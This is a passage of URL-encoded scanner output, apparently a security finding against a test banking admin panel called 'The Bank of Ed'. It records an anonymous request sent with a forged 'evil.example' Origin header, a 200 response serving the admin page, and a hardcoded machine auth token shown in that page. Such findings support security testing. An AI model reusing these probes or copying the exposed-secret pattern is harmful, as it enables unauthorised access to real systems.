0placeholder%3D%5C%22Search...%5C%22%20class%3D%5C%22px-4%20py-2.5%20rounded-xl%20border%20border-dark-200%20focus%3Aring-2%20focus%3Aring-red-500%20focus%3Aborder-red-500%20outline-none%20transition%20text-sm%20w-48%5C%22%20onkeyup%3D%5C%22BankOfEdAdmin.CustomersPage.handleSearch(event)%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Cdiv%20id%3D%5C%22customers-table%5C%22%20class%3D%5C%22bg-white%20rounded-2xl%20shadow-sm%20border%20border-dark-100%20overflow-hidden%5C%22%3E%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Cdiv%20id%3D%5C%22customers-pagination%5C%22%20class%3D%5C%22mt-4%20flex%20items-center%20justify-between%5C%22%3E%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%3C%2Fsection%3E%5Cn%5Cn%20%20%20%20%20%20%20%20%3C!--%20Customer%20Detail%20--%3E%5Cn%20%20%20%20%20%20%20%20%3Csection%20id%3D%5C%22page-customer-detail%5C%22%20class%3D%5C%22hidden%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Ca%20href%3D%5C%22%23%2Fcustomers%5C%22%20class%3D%5C%22inline-flex%20items-center%20gap-1%20text-red-600%20hover%3Atext-red-700%20text-sm%20font-medium%20mb-6%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3Csvg%20class%3D%5C%22w-4%20h-4%5C%22%20fill%3D%5C%22none%5C%22%20stroke%3D%5C%22currentColor%5C%22%20viewBox%3D%5C%220%200%2024%2024%5C%22%3E%3Cpath%20stroke-linecap%3D%5C%22round%5C%22%20stroke-linejoin%3D%5C%22round%5C%22%20stroke-width%3D%5C%222%5C%22%20d%3D%5C%22M15%2019l-7-7%207-7%5C%22%3E%3C%2Fpath%3E%3C%2Fsvg%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20Back%20to%20Customers%5Cn%20%20%20%20%20%20%20%20%20%20%3C%2Fa%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Cdiv%20id%3D%5C%22customer-detail-content%5C%22%3E%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%3C%2Fsection%3E%5Cn%5Cn%20%20%20%20%20%20%20%20%3C!--%20Accounts%20--%3E%5Cn%20%20%20%20%20%20%20%20%3Csection%20id%3D%5C%22page-accounts%5C%22%20class%3D%5C%22hidden%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22mb-6%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3Ch1%20class%3D%5C%22text-2xl%20font-bold%20text-dark-900%5C%22%3EAll%20Accounts%3C%2Fh1%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3Cp%20class%3D%5C%22text-dark-500%20mt-1%5C%22%3EView%20and%20manage%20all%20bank%20accounts%3C%2Fp%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Cdiv%20id%3D%5C%22accounts-table%5C%22%20class%3D%5C%22bg-white%20rounded-2xl%20shadow-sm%20border%20border-dark-100%20overflow-hidden%5C%22%3E%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Cdiv%20id%3D%5C%22accounts-pagination%5C%22%20class%3D%5C%22mt-4%20flex%20items-center%20justify-between%5C%22%3E%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%3C%2Fsection%3E%5Cn%5Cn%20%20%20%20%20%20%20%20%3C!--%20FX%20Rates%20--%3E%5Cn%20%20%20%20%20%20%20%20%3Csection%20id%3D%5C%22page-fx-rates%5C%22%20class%3D%5C%22hidden%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22flex%20items-center%20justify-between%20mb-6%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ch1%20class%3D%5C%22text-2xl%20font-bold%20text-dark-900%5C%22%3EFX%20Rates%3C%2Fh1%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cp%20class%3D%5C%22text-dark-500%20mt-1%5C%22%3EManage%20foreign%20exchange%20rates%3C%2Fp%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3Cbutton%20onclick%3D%5C%22BankOfEdAdmin.FxRatesPage.showAddModal()%5C%22%20class%3D%5C%22bg-red-600%20hover%3Abg-red-700%20text-white%20font-semibold%20px-5%20py-2.5%20rounded-xl%20transition-colors%20text-sm%20flex%20items-center%20gap-2%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Csvg%20class%3D%5C%22w-4%20h-4%5C%22%20fill%3D%5C%22none%5C%22%20stroke%3D%5C%22currentColor%5C%22%20viewBox%3D%5C%220%200%2024%2024%5C%22%3E%3Cpath%20stroke-linecap%3D%5C%22round%5C%22%20stroke-linejoin%3D%5C%22round%5C%22%20stroke-width%3D%5C%222%5C%22%20d%3D%5C%22M12%204v16m8-8H4%5C%22%3E%3C%2Fpath%3E%3C%2Fsvg%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20Add%20Rate%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fbutton%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Cdiv%20id%3D%5C%22fx-rates-table%5C%22%20class%3D%5C%22bg-white%20rounded-2xl%20shadow-sm%20border%20border-dark-100%20overflow-hidden%5C%22%3E%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%3C%2Fsection%3E%5Cn%5Cn%20%20%20%20%20%20%20%20%3C!--%20System%20--%3E%5Cn%20%20%20%20%20%20%20%20%3Csection%20id%3D%5C%22page-system%5C%22%20class%3D%5C%22hidden%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22mb-6%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3Ch1%20class%3D%5C%22text-2xl%20font-bold%20text-dark-900%5C%22%3ESystem%20Management%3C%2Fh1%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3Cp%20class%3D%5C%22text-dark-500%20mt-1%5C%22%3EIntegration%20settings%2C%20database%20operations%20and%20maintenance%3C%2Fp%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%5Cn%20%20%20%20%20%20%20%20%20%20%3C!--%20White-Label%20Partner%20Settings%20Card%20--%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22bg-white%20rounded-2xl%20shadow-sm%20border%20border-dark-100%20p-6%20sm%3Ap-8%20max-w-xl%20mb-6%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22flex%20items-center%20gap-3%20mb-4%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22w-12%20h-12%20bg-amber-100%20rounded-full%20flex%20items-center%20justify-center%20flex-shrink-0%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Csvg%20class%3D%5C%22w-6%20h-6%20text-amber-600%5C%22%20fill%3D%5C%22none%5C%22%20stroke%3D%5C%22currentColor%5C%22%20viewBox%3D%5C%220%200%2024%2024%5C%22%3E%3Cpath%20stroke-linecap%3D%5C%22round%5C%22%20stroke-linejoin%3D%5C%22round%5C%22%20stroke-width%3D%5C%222%5C%22%20d%3D%5C%22M13.828%2010.172a4%204%200%2000-5.656%200l-4%204a4%204%200%20105.656%205.656l1.102-1.101m-.758-4.899a4%204%200%20005.656%200l4-4a4%204%200%2000-5.656-5.656l-1.1%201.1%5C%22%3E%3C%2Fpath%3E%3C%2Fsvg%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ch2%20class%3D%5C%22text-xl%20font-bold%20text-dark-900%5C%22%3EFACE%20Insurance%20Integration%3C%2Fh2%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cp%20class%3D%5C%22text-sm%20text-dark-500%5C%22%3EConfigure%20target%20URL%20for%20White-Label%20Insurance%20SSO%3C%2Fp%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3Cform%20id%3D%5C%22insurance-settings-form%5C%22%20onsubmit%3D%5C%22BankOfEdAdmin.SystemPage.saveSettings(event)%5C%22%20class%3D%5C%22space-y-4%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Clabel%20class%3D%5C%22block%20text-sm%20font-medium%20text-dark-700%20mb-1.5%5C%22%3EFACE%20Insurance%20Base%20URL%3C%2Flabel%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cinput%20type%3D%5C%22url%5C%22%20id%3D%5C%22setting-insurance-url%5C%22%20required%20class%3D%5C%22w-full%20px-4%20py-3%20rounded-xl%20border%20border-dark-200%20focus%3Aring-2%20focus%3Aring-red-500%20focus%3Aborder-red-500%20outline-none%20transition%20text-sm%5C%22%20placeholder%3D%5C%22http%3A%2F%2Flocalhost%3A8001%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cp%20class%3D%5C%22text-xs%20text-dark-400%20mt-1.5%5C%22%3EWhen%20customers%20click%20Insurance%2C%20they%20will%20be%20redirected%20to%20this%20URL%20with%20an%20SSO%20assertion%20token.%3C%2Fp%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22p-3.5%20bg-dark-50%20rounded-xl%20text-xs%20text-dark-600%20space-y-1%20font-mono%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%3E%3Cspan%20class%3D%5C%22font-semibold%20text-dark-800%5C%22%3EMerchant%20ID%3A%3C%2Fspan%3E%20%3Cspan%20id%3D%5C%22setting-merchant-id%5C%22%3Efaceinsurance%3C%2Fspan%3E%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%3E%3Cspan%20class%3D%5C%22font-semibold%20text-dark-800%5C%22%3ESettlement%20Account%3A%3C%2Fspan%3E%20%3Cspan%20id%3D%5C%22setting-merchant-account%5C%22%3E062-001%2088880001%20(face%40example.com)%3C%2Fspan%3E%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%3E%3Cspan%20class%3D%5C%22font-semibold%20text-dark-800%5C%22%3EMachine%20Auth%20Token%3A%3C%2Fspan%3E%20%3Cspan%20id%3D%5C%22setting-machine-token%5C%22%20class%3D%5C%22text-dark-500%5C%22%3Emch_face_insurance_secret_key_2026%3C%2Fspan%3E%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cbutton%20type%3D%5C%22submit%5C%22%20id%3D%5C%22save-settings-btn%5C%22%20class%3D%5C%22bg-dark-900%20hover%3Abg-dark-800%20text-white%20font-semibold%20px-6%20py-2.5%20rounded-xl%20transition-colors%20text-sm%20flex%20items-center%20justify-center%20gap-2%20disabled%3Aopacity-50%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cspan%3ESave%20Settings%3C%2Fspan%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Csvg%20class%3D%5C%22w-4%20h-4%20animate-spin%20hidden%5C%22%20viewBox%3D%5C%220%200%2024%2024%5C%22%3E%3Ccircle%20class%3D%5C%22opacity-25%5C%22%20cx%3D%5C%2212%5C%22%20cy%3D%5C%2212%5C%22%20r%3D%5C%2210%5C%22%20stroke%3D%5C%22currentColor%5C%22%20stroke-width%3D%5C%224%5C%22%20fill%3D%5C%22none%5C%22%3E%3C%2Fcircle%3E%3Cpath%20class%3D%5C%22opacity-75%5C%22%20fill%3D%5C%22currentColor%5C%22%20d%3D%5C%22M4%2012a8%208%200%20018-8V0C5.373%200%200%205.373%200%2012h4z%5C%22%3E%3C%2Fpath%3E%3C%2Fsvg%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fbutton%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fform%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%5Cn%20%20%20%20%20%20%20%20%20%20%3C!--%20Reset%20Database%20Card%20--%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22bg-white%20rounded-2xl%20shadow-sm%20border%20border-red-200%20p-6%20sm%3Ap-8%20max-w-xl%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22flex%20items-center%20gap-3%20mb-4%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22w-12%20h-12%20bg-red-100%20rounded-full%20flex%20items-center%20justify-center%20flex-shrink-0%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Csvg%20class%3D%5C%22w-6%20h-6%20text-red-600%5C%22%20fill%3D%5C%22none%5C%22%20stroke%3D%5C%22currentColor%5C%22%20viewBox%3D%5C%220%200%2024%2024%5C%22%3E%3Cpath%20stroke-linecap%3D%5C%22round%5C%22%20stroke-linejoin%3D%5C%22round%5C%22%20stroke-width%3D%5C%222%5C%22%20d%3D%5C%22M12%209v2m0%204h.01m-6.938%204h13.856c1.54%200%202.502-1.667%201.732-3L13.732%204c-.77-1.333-2.694-1.333-3.464%200L3.34%2016c-.77%201.333.192%203%201.732%203z%5C%22%3E%3C%2Fpath%3E%3C%2Fsvg%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ch2%20class%3D%5C%22text-xl%20font-bold%20text-dark-900%5C%22%3EReset%20Database%3C%2Fh2%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cp%20class%3D%5C%22text-sm%20text-dark-500%5C%22%3EDrop%20and%20recreate%20the%20entire%20database%20with%20seed%20data%3C%2Fp%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22bg-red-50%20border%20border-red-200%20rounded-xl%20p-4%20mb-6%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cp%20class%3D%5C%22text-red-800%20text-sm%20font-medium%5C%22%3EWarning%3A%20This%20action%20is%20irreversible%3C%2Fp%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cp%20class%3D%5C%22text-red-600%20text-xs%20mt-1%5C%22%3EAll%20customer%20data%2C%20accounts%2C%20and%20transactions%20will%20be%20permanently%20deleted%20and%20replaced%20with%20default%20seed%20data.%3C%2Fp%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3Cp%20class%3D%5C%22text-sm%20text-dark-600%20mb-3%5C%22%3EType%20%3Cstrong%3ERESET%3C%2Fstrong%3E%20below%20to%20confirm%3A%3C%2Fp%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3Cinput%20type%3D%5C%22text%5C%22%20id%3D%5C%22reset-confirm-input%5C%22%20class%3D%5C%22w-full%20px-4%20py-3%20rounded-xl%20border%20border-dark-200%20focus%3Aring-2%20focus%3Aring-red-500%20focus%3Aborder-red-500%20outline-none%20transition%20font-mono%20tracking-widest%20text-center%20text-lg%20mb-4%5C%22%20placeholder%3D%5C%22Type%20RESET%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3Cbutton%20id%3D%5C%22reset-btn%5C%22%20onclick%3D%5C%22BankOfEdAdmin.SystemPage.handleReset()%5C%22%20class%3D%5C%22w-full%20bg-red-600%20hover%3Abg-red-700%20text-white%20font-semibold%20py-3%20rounded-xl%20transition-colors%20flex%20items-center%20justify-center%20gap-2%20disabled%3Aopacity-50%20disabled%3Acursor-not-allowed%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cspan%3EReset%20Database%3C%2Fspan%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Csvg%20class%3D%5C%22w-4%20h-4%20animate-spin%20hidden%5C%22%20viewBox%3D%5C%220%200%2024%2024%5C%22%3E%3Ccircle%20class%3D%5C%22opacity-25%5C%22%20cx%3D%5C%2212%5C%22%20cy%3D%5C%2212%5C%22%20r%3D%5C%2210%5C%22%20stroke%3D%5C%22currentColor%5C%22%20stroke-width%3D%5C%224%5C%22%20fill%3D%5C%22none%5C%22%3E%3C%2Fcircle%3E%3Cpath%20class%3D%5C%22opacity-75%5C%22%20fill%3D%5C%22currentColor%5C%22%20d%3D%5C%22M4%2012a8%208%200%20018-8V0C5.373%200%200%205.373%200%2012h4z%5C%22%3E%3C%2Fpath%3E%3C%2Fsvg%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fbutton%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%3C%2Fsection%3E%5Cn%5Cn%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%3C%2Fmain%3E%5Cn%20%20%3C%2Fdiv%3E%5Cn%5Cn%20%20%3C!--%20Scripts%20--%3E%5Cn%20%20%3Cscript%20src%3D%5C%22js%2Futils.js%5C%22%3E%3C%2Fscript%3E%5Cn%20%20%3Cscript%20src%3D%5C%22js%2Fapi.js%5C%22%3E%3C%2Fscript%3E%5Cn%20%20%3Cscript%20src%3D%5C%22js%2Frouter.js%5C%22%3E%3C%2Fscript%3E%5Cn%20%20%3Cscript%20src%3D%5C%22js%2Fpages%2Fauth.js%5C%22%3E%3C%2Fscript%3E%5Cn%20%20%3Cscript%20src%3D%5C%22js%2Fpages%2Fcustomers.js%5C%22%3E%3C%2Fscript%3E%5Cn%20%20%3Cscript%20src%3D%5C%22js%2Fpages%2Faccounts.js%5C%22%3E%3C%2Fscript%3E%5Cn%20%20%3Cscript%20src%3D%5C%22js%2Fpages%2Fsystem.js%5C%22%3E%3C%2Fscript%3E%5Cn%20%20%3Cscript%20src%3D%5C%22js%2Fpages%2Ffx-rates.js%5C%22%3E%3C%2Fscript%3E%5Cn%20%20%3Cscript%20src%3D%5C%22js%2Fapp.js%5C%22%3E%3C%2Fscript%3E%5Cn%3C%2Fbody%3E%5Cn%3C%2Fhtml%3E%22%2C%22request_evidence%22%3A%22GET%20http%3A%2F%2Flocalhost%3A8081%2Fadmin%2F%5Cnuse_session%3A%20anonymous%20%20Authorization%3A%20present%5CnCookies%3A%20none%5Cn%7B%5C%22Origin%5C%22%3A%20%5C%22https%3A%2F%2Fevil.example%5C%22%7D%5Cn%22%2C%22response_evidence%22%3A%22Status%3A%20200%5Cndate%3A%20Tue%2C%2008%20Sep%202026%2013%3A29%3A35%20GMT%5Cnserver%3A%20Apache%2F2.4.68%20(Unix)%5Cnlast-modified%3A%20Sun%2C%2023%20Aug%202026%2012%3A34%3A31%20GMT%5Cnetag%3A%20%5C%224c9c-659b6175aa3c0%5C%22%5Cnaccept-ranges%3A%20bytes%5Cncontent-length%3A%2019612%5Cnkeep-alive%3A%20timeout%3D5%2C%20max%3D100%5Cnconnection%3A%20Keep-Alive%5Cncontent-type%3A%20text%2Fhtml%5Cn%5Cn%3C!DOCTYPE%20html%3E%5Cn%3Chtml%20lang%3D%5C%22en%5C%22%3E%5Cn%3Chead%3E%5Cn%20%20%3Cmeta%20charset%3D%5C%22UTF-8%5C%22%3E%5Cn%20%20%3Cmeta%20name%3D%5C%22viewport%5C%22%20content%3D%5C%22width%3Ddevice-width%2C%20initial-scale%3D1.0%5C%22%3E%5Cn%20%20%3Ctitle%3EThe%20Bank%20of%20Ed%20-%20Admin%3C%2Ftitle%3E%5Cn%20%20%3Clink%20rel%3D%5C%22preconnect%5C%22%20href%3D%5C%22https%3A%2F%2Ffonts.googleapis.com%5C%22%3E%5Cn%20%20%3Clink%20rel%3D%5C%22preconnect%5C%22%20href%3D%5C%22https%3A%2F%2Ffonts.gstatic.com%5C%22%20crossorigin%3E%5Cn%20%20%3Clink%20href%3D%5C%22https%3A%2F%2Ffonts.googleapis.com%2Fcss2%3Ffamily%3DInter%3Awght%40300%3B400%3B500%3B600%3B700%26display%3Dswap%5C%22%20rel%3D%5C%22stylesheet%5C%22%3E%5Cn%20%20%3Cscript%20src%3D%5C%22https%3A%2F%2Fcdn.tailwindcss.com%5C%22%3E%3C%2Fscript%3E%5Cn%20%20%3Cscript%3E%5Cn%20%20%20%20tailwind.config%20%3D%20%7B%5Cn%20%20%20%20%20%20theme%3A%20%7B%5Cn%20%20%20%20%20%20%20%20extend%3A%20%7B%5Cn%20%20%20%20%20%20%20%20%20%20colors%3A%20%7B%5Cn%20%20%20%20%20%20%20%20%20%20%20%20dark%3A%20%7B%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%2050%3A%20'%23f4f4f5'%2C%20100%3A%20'%23e4e4e7'%2C%20200%3A%20'%23d4d4d8'%2C%20300%3A%20'%23a1a1aa'%2C%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20400%3A%20'%2371717a'%2C%20500%3A%20'%2352525b'%2C%20600%3A%20'%233f3f46'%2C%20700%3A%20'%2327272a'%2C%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20800%3A%20'%2318181b'%2C%20900%3A%20'%2309090b'%2C%20950%3A%20'%23030305'%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%7D%5Cn%20%20%20%20%20%20%20%20%20%20%7D%2C%5Cn%20%20%20%20%20%20%20%20%20%20fontFamily%3A%20%7B%20sans%3A%20%5B'Inter'%2C%20'system-ui'%2C%20'sans-serif'%5D%20%7D%5Cn%20%20%20%20%20%20%20%20%7D%5Cn%20%20%20%20%20%20%7D%5Cn%20%20%20%20%7D%5Cn%20%20%3C%2Fscript%3E%5Cn%20%20%3Clink%20rel%3D%5C%22stylesheet%5C%22%20href%3D%5C%22css%2Fapp.css%5C%22%3E%5Cn%3C%2Fhead%3E%5Cn%3Cbody%20class%3D%5C%22bg-dark-50%20font-sans%20text-dark-800%5C%22%3E%5Cn%5Cn%20%20%3C!--%20Toast%20Container%20--%3E%5Cn%20%20%3Cdiv%20id%3D%5C%22toast-container%5C%22%20class%3D%5C%22fixed%20top-4%20right-4%20z-50%20space-y-2%5C%22%3E%3C%2Fdiv%3E%5Cn%5Cn%20%20%3C!--%20Modal%20Overlay%20--%3E%5Cn%20%20%3Cdiv%20id%3D%5C%22modal-overlay%5C%22%20class%3D%5C%22hidden%20fixed%20inset-0%20z-40%20bg-black%2F50%20backdrop-blur-sm%20flex%20items-center%20justify-center%20p-4%5C%22%3E%5Cn%20%20%20%20%3Cdiv%20id%3D%5C%22modal-content%5C%22%20class%3D%5C%22bg-white%20rounded-2xl%20shadow-2xl%20w-full%20max-w-md%20max-h-%5B90vh%5D%20overflow-y-auto%5C%22%3E%3C%2Fdiv%3E%5Cn%20%20%3C%2Fdiv%3E%5Cn%5Cn%20%20%3C!--%20%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%20AUTH%20VIEW%20%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%20--%3E%5Cn%20%20%3Cdiv%20id%3D%5C%22view-auth%5C%22%20class%3D%5C%22hidden%20min-h-screen%20flex%20items-center%20justify-center%20bg-gradient-to-br%20from-dark-900%20via-dark-800%20to-dark-950%20p-4%5C%22%3E%5Cn%20%20%20%20%3Cdiv%20class%3D%5C%22w-full%20max-w-md%5C%22%3E%5Cn%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22text-center%20mb-8%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22inline-flex%20items-center%20gap-3%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22w-12%20h-12%20bg-red-600%20rounded-xl%20flex%20items-center%20justify-center%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3Csvg%20class%3D%5C%22w-7%20h-7%20text-white%5C%22%20fill%3D%5C%22none%5C%22%20stroke%3D%5C%22currentColor%5C%22%20viewBox%3D%5C%220%200%2024%2024%5C%22%3E%3Cpath%20stroke-linecap%3D%5C%22round%5C%22%20stroke-linejoin%3D%5C%22round%5C%22%20stroke-width%3D%5C%222%5C%22%20d%3D%5C%22M10.325%204.317c.426-1.756%202.924-1.756%203.35%200a1.724%201.724%200%20002.573%201.066c1.543-.94%203.31.826%202.37%202.37a1.724%201.724%200%20001.066%202.573c1.756.426%201.756%202.924%200%203.35a1.724%201.724%200%2000-1.066%202.573c.94%201.543-.826%203.31-2.37%202.37a1.724%201.724%200%2000-2.573%201.066c-.426%201.756-2.924%201.756-3.35%200a1.724%201.724%200%2000-2.573-1.066c-1.543.94-3.31-.826-2.37-2.37a1.724%201.724%200%2000-1.066-2.573c-1.756-.426-1.756-2.924%200-3.35a1.724%201.724%200%20001.066-2.573c-.94-1.543.826-3.31%202.37-2.37.996.608%202.296.07%202.572-1.065z%5C%22%3E%3C%2Fpath%3E%3Cpath%20stroke-linecap%3D%5C%22round%5C%22%20stroke-linejoin%3D%5C%22round%5C%22%20stroke-width%3D%5C%222%5C%22%20d%3D%5C%22M15%2012a3%203%200%2011-6%200%203%203%200%20016%200z%5C%22%3E%3C%2Fpath%3E%3C%2Fsvg%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Ch1%20class%3D%5C%22text-3xl%20font-bold%20text-white%5C%22%3EThe%20Bank%20of%20Ed%3C%2Fh1%3E%5Cn%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%3Cp%20class%3D%5C%22text-dark-400%20mt-2%5C%22%3EAdministration%20Panel%3C%2Fp%3E%5Cn%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%5Cn%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22bg-white%20rounded-2xl%20shadow-2xl%20overflow-hidden%20p-8%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%3Cform%20id%3D%5C%22login-form%5C%22%20onsubmit%3D%5C%22BankOfEdAdmin.AuthPage.handleLogin(event)%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22space-y-5%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Clabel%20class%3D%5C%22block%20text-sm%20font-medium%20text-dark-700%20mb-1.5%5C%22%3EUsername%3C%2Flabel%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cinput%20type%3D%5C%22text%5C%22%20name%3D%5C%22username%5C%22%20required%20class%3D%5C%22w-full%20px-4%20py-3%20rounded-xl%20border%20border-dark-200%20focus%3Aring-2%20focus%3Aring-red-500%20focus%3Aborder-red-500%20outline-none%20transition%5C%22%20placeholder%3D%5C%22admin%5C%22%20autofocus%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Clabel%20class%3D%5C%22block%20text-sm%20font-medium%20text-dark-700%20mb-1.5%5C%22%3EPassword%3C%2Flabel%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cinput%20type%3D%5C%22password%5C%22%20name%3D%5C%22password%5C%22%20required%20class%3D%5C%22w-full%20px-4%20py-3%20rounded-xl%20border%20border-dark-200%20focus%3Aring-2%20focus%3Aring-red-500%20focus%3Aborder-red-500%20outline-none%20transition%5C%22%20placeholder%3D%5C%22Enter%20password%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E